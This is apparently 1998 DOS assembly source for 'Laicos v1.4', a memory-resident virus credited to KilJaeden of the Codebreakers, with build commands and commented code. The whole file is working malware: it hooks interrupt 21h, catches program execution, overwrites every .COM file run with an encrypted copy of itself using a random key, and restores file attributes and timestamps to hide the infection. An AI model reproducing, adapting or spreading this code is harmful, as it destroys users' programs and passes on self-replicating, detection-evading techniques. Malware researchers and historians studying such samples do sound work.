; ------------------------------------------------------------------------- ;
;           Laicos v1.4 coded by KilJaeden of the Codebreakers 1998         ;
; ------------------------------------------------------------------------- ;
; Description: `-------------------| Started: 06/06/98 | Finished: 07/06/98 ;
;                                  `-------------------^------------------- ;
; v1.0 - memory resident *.com overwritter, MCB style           | Size: 283 ;
; v1.1 - makes sure it is really a .com file                    `---------- ;
; v1.2 - add infection of any file + restores attributes                    ;
; v1.3 - add time/date restoration of infected files                        ;
; v1.4 - add XOR,NOT,NEG,ROR encryption to this                             ;
; ------------------------------------------------------------------------- ;
;  Thanks: To SPo0ky!! I Could not have done this without his patience!!!!  ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm laicos.asm                                            ;
; to link :::::] tlink /t laicos.obj                                        ;
; ------------------------------------------------------------------------- ;

code    segment                         ; name our segment 'code'
        assume  cs:code,ds:code         ; assign cs and ds to code
        org     100h                    ; this be a .com file
        .286                            ; need this for pusha/popa

start:  jmp     first                   ; jump to first (overwritten)
        xor     bp,bp                   ; XOR the value of bp to 0
        lea     si,encd                 ; load SI with encrypted area start
        mov     di,si                   ; DI points there now too
        call    encr                    ; call the encryption routine
        jmp     encd                    ; jump to encrypted area

encr:   lodsb                           ; load a byte
        not     al                      ; encryptin 1
        ror     al,4                    ; encryptin 2
        neg     al                      ; encryptin 3
key:    xor     al,0                    ; encryptin 4
        neg     al                      ; unencrypt 3
        ror     al,4                    ; unencrypt 2
        not     al                      ; unencrypt 1
        stosb                           ; put the byte back
        loop    encr                    ; do it for all bytes
        ret                             ; return from call

encd:   mov     ax,0deadh               ; move 0deadh into AX
        int     21h                     ; if resident, 0deadh is in BX now
        cmp     bx,0deadh               ; are we resident?
        jne     go_rez                  ; nope were not, go rezident now
        int     20h                     ; we are, terminate

go_rez: sub     word ptr cs:[2],80h     ; lower top of memory data in PSP
        mov     ax,cs                   ; move CS into AX
        dec     ax                      ; decrement AX and
        mov     ds,ax                   ; move AX into DS
        sub     word ptr ds:[3],40h     ; sub 1kb from accessed MCB
        xor     ax,ax                   ; ax to 0
        mov     ds,ax                   ; DS has no value now
        sub     word ptr ds:[413h],2    ; adjust BIOS data area by 2kb
        mov     ax,word ptr ds:[413h]   ; move adjusted BIOS mem to AX
        mov     cl,6                    ; load cl with 6
        shl     ax,cl                   ; multiply BIOS base mem by 64
        mov     es,ax                   ; move the value into ES
        push    cs                      ; get cs again so you can
        pop     ds                      ; restore DS to original value
        xor     di,di                   ; DI must be 0 now
        lea     si,start                ; load SI with start of virus
        mov     cx,finish-start         ; # of bytes to write
        rep     movsb                   ; load the virus into memory

hook:   push    es                            ; push the value in ES
        pop     ds                            ; pop it into DS
        mov     ax,3521h                      ; get the int 21h interrupt
        int     21h                           ; get it now man!
        mov     word ptr ds:[oi21-100h],bx    ; save the old one here
        mov     word ptr ds:[oi21+2-100h],es  ; save it here too
        mov     ax,2521h                      ; point IVT to new ISR
        lea     dx,isr-100h                   ; load DX with start of ISR
        int     21h                           ; IVT now points to new ISR
        int     20h                           ; end now that we have hooked

isr:    pushf                           ; push all flags
        cmp     ax,0deadh               ; have we added check value?
        jne     exec                    ; yup, wait for a 4bh
        mov     bx,0deadh               ; nope, adding it now
        popf                            ; pop the flags
        iret                            ; pop cs:ip+flags from stack

exec:   pusha                           ; push all registers
        push    ds                      ; push value of DS
        push    es                      ; push ES as well
        cmp     ah,4bh                  ; something being executed?
        je      main                    ; yup, check if .com
        jne     exit                    ; nope, point to original ISR

main:   push    ds                      ; push DS again
        pop     es                      ; and pop it into ES
        mov     di,dx                   ; move file name info to DI
        mov     cx,64                   ; 64 byte file name possible
        mov     al,'.'                  ; load al with .
        cld                             ; clear direction flag
        repnz   scasb                   ; scan until . is hit
        cmp     word ptr ds:[di],'OC'   ; is it .CO- ?
        jne     exit                    ; not a .com file, exit
        cmp     word ptr ds:[di+2],'M'  ; check for .--M
        jne     exit                    ; not a .com file, exit

        mov     ax,4300h                ; get the file attributes
        int     21h                     ; we have them now
        push    cx                      ; save the values
        push    dx                      ; save the values
        push    ds                      ; save the values

        mov     ax,4301h                ; set file attributes
        xor     cx,cx                   ; to none at all
        int     21h                     ; set them now 

        mov     ax,3d02h                ; open the file then
        int     21h                     ; file is now open
        xchg    ax,bx                   ; save the file info

        push    cs                      ; push 100h
        push    cs                      ; push it again
        pop     ds                      ; into DS
        pop     es                      ; into ES

        mov     ax,5700h                ; get time / date stamps
        int     21h                     ; we have the stamps now
        push    dx                      ; save the time
        push    cx                      ; save the date

        in      al,40h                      ; get random value
        mov     byte ptr cs:[key-100h+1],al ; save as our key

        mov     ah,40h                  ; write to file
        lea     dx,start-100h           ; load start address
        mov     cx,encd-start           ; # of bytes to write
        int     21h                     ; write them now

        mov     bp,100h                 ; load bp with 100h
        lea     di,finish-100h          ; end of encrypted stuff
        lea     si,encd-100h            ; start of encrypted stuff
        mov     cx,finish-encd          ; # of bytes to encrypt
        cld                             ; clear direction flag
        call    encr                    ; call the encryption routine

        mov     ah,40h                  ; write to file
        mov     cx,finish-encd          ; total # of bytes to write
        lea     dx,finish-100h          ; write from here
        int     21h                     ; write them now
                
        mov     ax,5701h                ; restore time / date
        pop     cx                      ; from this value
        pop     dx                      ; and from this value
        int     21h                     ; restore them now

        mov     ax,4301h                ; set file attributes
        pop     ds                      ; restore from saved value
        pop     dx                      ; restore from this one too
        pop     cx                      ; and lastely, this one
        int     21h                     ; attributes are restored

        mov     ah,3eh                  ; close the file
        int     21h                     ; it's closed

exit:   pop     es                      ; pop ES from stack
        pop     ds                      ; pop DS from stack
        popa                            ; pop all registers
        popf                            ; pop all flags
        db      0eah                    ; jump to original ISR

; --------------------------( The Data Area ) ----------------------------- ;
; ------------------------------------------------------------------------- ;

        oi21    dd ?                    ; old int 21 is here
        finish  label near              ; the offset label

; ---------------------( Not Saved / Not Encrypted )----------------------- ;
; ------------------------------------------------------------------------- ;

first:  lea     di,start                ; load with start address
        lea     si,new                  ; overwrite with these bytes
        movsw                           ; overwrite two bytes
        movsb                           ; overwrite one byte
        jmp     encd                    ; jump to encrypted area start

new:    mov     cx,finish-encd          ; this will overwrite the jump

; ----------------------------( Its All Over )----------------------------- ;
; ------------------------------------------------------------------------- ;

        code    ends                    ; end code segment
        end     start                   ; end / where to start

; ------------------------------------------------------------------------- ;
; ---------> How Can You Think Freely In The Shadow Of A Church? <--------- ;
; ------------------------------------------------------------------------- ;
